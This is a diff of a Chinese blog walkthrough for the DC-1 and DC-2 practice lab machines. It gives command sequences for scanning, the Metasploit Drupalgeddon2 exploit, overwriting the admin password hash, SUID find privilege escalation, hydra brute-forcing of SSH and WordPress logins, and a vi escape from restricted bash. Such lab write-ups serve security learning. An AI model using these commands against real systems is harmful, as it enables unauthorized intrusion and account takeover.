@@ -86,13 +86,13 @@ DC-1环境虚拟机平台：VMware Workstation Pro
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    89k
+                    41k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    1:21
+                    37 mins.
                 </span>
                 
                 
@@ -134,32 +134,34 @@ DC-1环境虚拟机平台：VMware Workstation Pro
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-1.png" alt="1-1"></p>
 <p>由于IP也不知道，所以没有目标下手，所以需要获取靶机的IP地址。Kali上使用<code>Nmap</code>扫描本网段下的所有主机</p>
 <p>先查看Kali所处的网段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-2.png" alt="1-2"></p>
+<pre><code>ifconfig
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-2.png" alt="1-2"></p>
 <p>Nmap通过Ping方法扫描网段内所有主机，排除掉其他IP，找到目标靶机（192.168.43.27）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.43.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-3.png" alt="1-3"></p>
+<pre><code>nmap -sP 192.168.43.0/24
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-3.png" alt="1-3"></p>
 <p>扫描主机开放的端口</p>
 <p>Ps：-sV，版本探测。版本探测不是进行端口扫描，而是通过相应的端口对应的服务，根据服务指纹识别出相应的版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.43.27</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-4.png" alt="1-4"></p>
+<pre><code>nmap -sV 192.168.43.27
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-4.png" alt="1-4"></p>
 <p>既然开放了<code>http服务的80端口</code>，那现在就直接用浏览器访问一下</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-5.png" alt="1-5"></p>
 <p>发现是典型的<code>Drupal Site</code>，那就可以启动<code>Metersploit</code>来帮助渗透</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-6.png" alt="1-6"></p>
+<pre><code>msfconsole
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-6.png" alt="1-6"></p>
 <p>搜索<code>drupal</code>的模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-7.png" alt="1-7"></p>
+<pre><code>search drupal
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-7.png" alt="1-7"></p>
 <p>使用2018-03-28的测试，成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rhosts 192.168.43.27</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-8.png" alt="1-8"></p>
+<pre><code>use exploit/unix/webapp/drupal_drupalgeddon2
+set rhosts 192.168.43.27
+run
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-8.png" alt="1-8"></p>
 <p>获取<code>shell</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-9.png" alt="1-9"></p>
+<pre><code>shell
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-9.png" alt="1-9"></p>
 <p>使用<code>Python</code>反弹回一个交互式shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-10.png" alt="1-10"></p>
+<pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-10.png" alt="1-10"></p>
 <p>在当前目录下（网页根目录<code>/var/www/</code>）发现<code>flag1.txt</code>，查看后给出提示：</p>
 <blockquote>
 <p>Every good CMS needs a config file - and so do you.</p>
@@ -173,17 +175,21 @@ DC-1环境虚拟机平台：VMware Workstation Pro
 <p>大意应该就是我们能用当前配置文件下的信息做一些什么呢？注意到提示下面有数据库的账号密码，所以我们可以拿着这个去登录数据库</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-12.png" alt="1-12"></p>
 <p>尝试登录数据库，成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-13.png" alt="1-13"></p>
+<pre><code>mysql -u dbuser -p
+R0ck3t
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-13.png" alt="1-13"></p>
 <p>查看<code>drupal库-users表</code>，发现了admin的账号密码，但是密码经过加密</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-14.png" alt="1-14"></p>
 <p>现在可以选择修改掉admin的密码，但是密码经过特殊算法加密，如果不按照它的加密规则修改，查询的时候还是会不正确，所以就必须按照加密规则加密然后去修改。参考文章：<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p>
 <p>退出数据库，切换到网站根目录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\q</span><br><span class="line">cd /var/www</span><br><span class="line">php scripts/password-hash.sh [123456]</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-15.png" alt="1-15"></p>
+<pre><code>\q
+cd /var/www
+php scripts/password-hash.sh [123456]
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-15.png" alt="1-15"></p>
 <p>再次进入数据库，将刚才返回的<code>hash值</code>拿去替换为<code>admin</code>的密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&quot;$S$DpO/2yRe.nB1y8WswwIgYPp/hxooDcHaPXrEW33ERy9o5ox2jLwa&quot; where name=&quot;admin&quot;;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-16.png" alt="1-16"></p>
+<pre><code>update users set pass=&quot;$S$DpO/2yRe.nB1y8WswwIgYPp/hxooDcHaPXrEW33ERy9o5ox2jLwa&quot; where name=&quot;admin&quot;;
+select * from users;
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-16.png" alt="1-16"></p>
 <p>更改完后，现在用户admin的密码就变为123456了，回到网站中尝试登陆，果然成功了</p>
 <p>并且在<code>Dashboard</code>模块找到了<code>flag3</code>，提示：</p>
 <blockquote>
@@ -191,45 +197,55 @@ DC-1环境虚拟机平台：VMware Workstation Pro
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-17.png" alt="1-17"></p>
 <p>flag3提示我们<code>提权（PERMS）</code>、<code>FIND命令</code>、<code>-exec</code>。既然涉及到提权，那么下一个flag应该是需要相应的权限才能查看，可以搜索一下flag关键字</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-18.png" alt="1-18"></p>
+<pre><code>find / -name &quot;flag*&quot;
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-18.png" alt="1-18"></p>
 <p>找到了<code>/home/flag4</code>目录下的<code>flag4.txt</code>，查看后给出了提示：</p>
 <blockquote>
 <p>Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-19.png" alt="1-19"></p>
 <p>提示我们<code>/root</code>下有下一个flag，但是尝试进入时，被拒绝了，只有<code>root</code>能访问</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cd /</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-20.png" alt="1-20"></p>
+<pre><code>cd /root
+cd /
+ls -l
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-20.png" alt="1-20"></p>
 <p>现在就需要<code>提权</code>了，根据flag3的提示，本次使用具有<code>SUID</code>的命令来提权，先找一下具有<code>SUID（4000）</code>权限的命令，可以发现find命令就有<code>4000</code>权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-21.png" alt="1-21"></p>
+<pre><code>find / -perm -4000
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-21.png" alt="1-21"></p>
 <p>现在就可以利用<code>find命令</code>来提权，直接获得<code>root</code>权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">touch ti_quan</span><br><span class="line">find / -name ti_quan -exec &quot;whoami&quot; \;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-22.png" alt="1-22"></p>
+<pre><code>cd /var/www
+touch ti_quan
+find / -name ti_quan -exec &quot;whoami&quot; \;
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-22.png" alt="1-22"></p>
 <p>弹出root权限的shell，查看<code>/root</code>下的flag了</p>
 <p>Ps：注意此处<code>&quot;/bin/sh&quot;</code>才会是<code>root</code>权限，如果换成<code>&quot;/bin/bash&quot;</code>就还会是<code>www-data</code>权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name ti_quan -exec &quot;/bin/sh&quot; \;</span><br><span class="line">cd \root</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-23.png" alt="1-23"></p>
+<pre><code>find / -name ti_quan -exec &quot;/bin/sh&quot; \;
+cd \root
+cat thefinalflag.txt
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-23.png" alt="1-23"></p>
 <p>看了参考的文章，知道本靶机还有一个玩法，就是用<code>hydra</code>去爆破flag4用户的密码，先介绍参数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l [指定用户名]</span><br><span class="line">-P [加载自定义的密码字典]</span><br><span class="line">ssh://[ip] 指定使用的协议和IP</span><br></pre></td></tr></table></figure>
-<p>先自己创建<code>password.txt</code>，然后使用hydra（由于我换了网络，所以IP改一下）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P password.txt ssh://192.168.43.27</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-24.png" alt="1-24"></p>
+<pre><code>-l [指定用户名]
+-P [加载自定义的密码字典]
+ssh://[ip] 指定使用的协议和IP
+</code></pre><p>先自己创建<code>password.txt</code>，然后使用hydra（由于我换了网络，所以IP改一下）</p>
+<pre><code>hydra -l flag4 -P password.txt ssh://192.168.43.27
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-24.png" alt="1-24"></p>
 <p>爆破出密码为<code>orange</code>，用ssh去连接登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.43.27</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-25.png" alt="1-25"></p>
+<pre><code>ssh flag4@192.168.43.27
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-25.png" alt="1-25"></p>
 <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84或192.168.2.107）</p>
 <p>靶机：DC-2（IP：192.168.43.10或192.168.2.109）</p>
 <h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC2靶机之后，照样利用<code>Nmap</code>扫描攻击机的网段，找到DC2的IP地址之后，扫描DC2的端口开放情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.43.0/24</span><br><span class="line">nmap -sV 192.168.43.10</span><br></pre></td></tr></table></figure>
-<p>扫描结果显示开放80端口，但是访问时却访问不了，用<code>-A</code>选项扫一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.43.10</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-12.png" alt="2-12"></p>
+<pre><code>nmap -sP 192.168.43.0/24
+nmap -sV 192.168.43.10
+</code></pre><p>扫描结果显示开放80端口，但是访问时却访问不了，用<code>-A</code>选项扫一下</p>
+<pre><code>nmap -A 192.168.43.10
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-12.png" alt="2-12"></p>
 <p>修改hosts文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-13.png" alt="2-13"></p>
+<pre><code>vi /etc/hosts
+cat /etc/hosts
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-13.png" alt="2-13"></p>
 <p>再次浏览器访问，发现是<code>WordPress</code>的站，并且发现<code>flag1</code>，提示：</p>
 <blockquote>
 <p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p>
@@ -241,23 +257,23 @@ DC-1环境虚拟机平台：VMware Workstation Pro
 <p>根据提示的内容，应该是要我们去获取后台的用户和密码</p>
 <p>首先，用Kali内的工具<code>wpscan（WordPress漏洞扫描器）</code>获取用户名</p>
 <p>Ps：<code>-e u</code>作用是枚举用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-2.png" alt="2-2"></p>
+<pre><code>wpscan --url http://dc-2/ -e u
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-2.png" alt="2-2"></p>
 <p>从扫描结果可以看出来，一共扫描出三个用户：<code>admin</code>、<code>jerry</code>、<code>tom</code>。创建文本<code>dc2_users.txt</code>，将三个用户写入其中</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-3.png" alt="2-3"></p>
 <p>接下来，使用Kali内的工具<code>cewl</code>扫描网站，获取可能的密码</p>
 <p>Ps：<code>-w</code>参数用来将扫描结果输出到文件内</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w dc2_passwords.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-4.png" alt="2-4"></p>
+<pre><code>cewl http://dc-2/ -w dc2_passwords.txt
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-4.png" alt="2-4"></p>
 <p>现在有了用户名和密码，可以利用刚才生成的<code>dc2_users.txt</code>和<code>dc2_passwords.txt</code>去爆破。有两种方法：1.wpscan 2.hydra</p>
 <p>方法一：wpscan</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U dc2_users -P dc2_passwords.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-5.png" alt="2-5"></p>
+<pre><code>wpscan --url http://dc-2/ -U dc2_users -P dc2_passwords.txt
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-5.png" alt="2-5"></p>
 <p>方法二：hydra</p>
 <p>由于hydra不行wpscan是专门针对WordPress的漏洞扫描工具，所以需要提供登录的页面<code>（wp-login.php）</code>、提交表单的方式<code>（POST）</code>以及表单的数据<code>（log、pwd等等）</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-6.png" alt="2-6"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dc2_users.txt -P dc2_passwords.txt dc-2 http-form-post &apos;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-7.png" alt="2-7"></p>
+<pre><code>hydra -L dc2_users.txt -P dc2_passwords.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-7.png" alt="2-7"></p>
 <p>现在得到了<code>jerry</code>和<code>tom</code>的用户名和密码，登录<code>jerry</code>账户，拿到了<code>flag2</code>，提示：</p>
 <blockquote>
 <p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
@@ -265,26 +281,73 @@ DC-1环境虚拟机平台：VMware Workstation Pro
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-8.png" alt="2-8"></p>
 <p>重新扫描靶机的所有端口，扫到7744端口（raqmon-pdu）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 192.168.43.10</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-9.png" alt="2-9"></p>
+<pre><code>nmap -p1-65535 192.168.43.10
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-9.png" alt="2-9"></p>
 <p>ssh连接，tom的账号</p>
 <p>Ps：由于这里端口不是22号端口，所以需要指定端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.43.10 -p 7744</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png" alt="2-10"></p>
+<pre><code>ssh tom@192.168.43.10 -p 7744
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png" alt="2-10"></p>
 <p>连接成功，但是碰到了<code>rbash (restricited Bash)</code>，许多命令都被禁用了</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-11.png" alt="2-11"></p>
 <p>用vi命令绕过受限的shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line">export -p</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png" alt="2-14"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export PATH=$PATH:/bin/</span></span><br><span class="line"><span class="comment"># export -p</span></span><br><span class="line"></span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/</span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> -p</span><br><span class="line"><span class="built_in">declare</span> -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line"><span class="built_in">declare</span> -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x OLDPWD</span><br><span class="line"><span class="built_in">declare</span> -x PATH=<span class="string">"/home/tom/usr/bin:/bin/"</span>	<span class="comment">#此处加入了/bin/</span></span><br><span class="line"><span class="built_in">declare</span> -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line"><span class="built_in">declare</span> -x SHLVL=<span class="string">"2"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_CLIENT=<span class="string">"192.168.2.107 45502 7744"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_CONNECTION=<span class="string">"192.168.2.107 45502 192.168.2.109 7744"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_TTY=<span class="string">"/dev/pts/0"</span></span><br><span class="line"><span class="built_in">declare</span> -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line"><span class="built_in">declare</span> -x USER=<span class="string">"tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x VIM=<span class="string">"/usr/share/vim"</span></span><br><span class="line"><span class="built_in">declare</span> -x VIMRUNTIME=<span class="string">"/usr/share/vim/vim74"</span></span><br></pre></td></tr></table></figure>
+<pre><code>vi flag3.txt
+:set shell=/bin/bash
+:shell
+export -p
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png" alt="2-14"></p>
+<pre><code class="bash"># export PATH=$PATH:/bin/
+# export -p
+
+tom@DC-2:~$ export PATH=$PATH:/bin/
+tom@DC-2:~$ export -p
+declare -x HOME=&quot;/home/tom&quot;
+declare -x LANG=&quot;en_US.UTF-8&quot;
+declare -x LOGNAME=&quot;tom&quot;
+declare -x MAIL=&quot;/var/mail/tom&quot;
+declare -x OLDPWD
+declare -x PATH=&quot;/home/tom/usr/bin:/bin/&quot;    #此处加入了/bin/
+declare -x PWD=&quot;/home/tom&quot;
+declare -x SHELL=&quot;/bin/rbash&quot;
+declare -x SHLVL=&quot;2&quot;
+declare -x SSH_CLIENT=&quot;192.168.2.107 45502 7744&quot;
+declare -x SSH_CONNECTION=&quot;192.168.2.107 45502 192.168.2.109 7744&quot;
+declare -x SSH_TTY=&quot;/dev/pts/0&quot;
+declare -x TERM=&quot;xterm-256color&quot;
+declare -x USER=&quot;tom&quot;
+declare -x VIM=&quot;/usr/share/vim&quot;
+declare -x VIMRUNTIME=&quot;/usr/share/vim/vim74&quot;
+</code></pre>
 <p>此时就绕过了限制，可以查看flag3.txt的内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat flag3.txt</span></span><br><span class="line"></span><br><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su <span class="keyword">for</span> all the stress he causes.</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#cat flag3.txt
+
+tom@DC-2:~$ cat flag3.txt
+Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+</code></pre>
 <p>提示如下</p>
 <blockquote>
 <p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>
 </blockquote>
 <p>根据提示，我们此时切换到jerry用户</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># su jerry</span></span><br><span class="line"><span class="comment"># adipiscing</span></span><br><span class="line"><span class="comment"># cd /home/jerry/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># cat flag4.txt</span></span><br><span class="line"></span><br><span class="line">tom@DC-2:~$ su jerry</span><br><span class="line">Password: </span><br><span class="line">jerry@DC-2:/home/tom$ <span class="built_in">cd</span> /home/jerry/</span><br><span class="line">jerry@DC-2:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">jerry@DC-2:~$ cat flag4.txt</span><br><span class="line">Good to see that you<span class="string">'ve made it this far - but you'</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">'re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash"># su jerry
+# adipiscing
+# cd /home/jerry/
+# ls
+# cat flag4.txt
+
+tom@DC-2:~$ su jerry
+Password: 
+jerry@DC-2:/home/tom$ cd /home/jerry/
+jerry@DC-2:~$ ls
+flag4.txt
+jerry@DC-2:~$ cat flag4.txt
+Good to see that you&#39;ve made it this far - but you&#39;re not home yet. 
+
+You still need to get the final flag (the only flag that really counts!!!).  
+
+No hints here - you&#39;re on your own now.  :-)
+
+Go on - git outta here!!!!
+</code></pre>
 <p>提示如下</p>
 <blockquote>
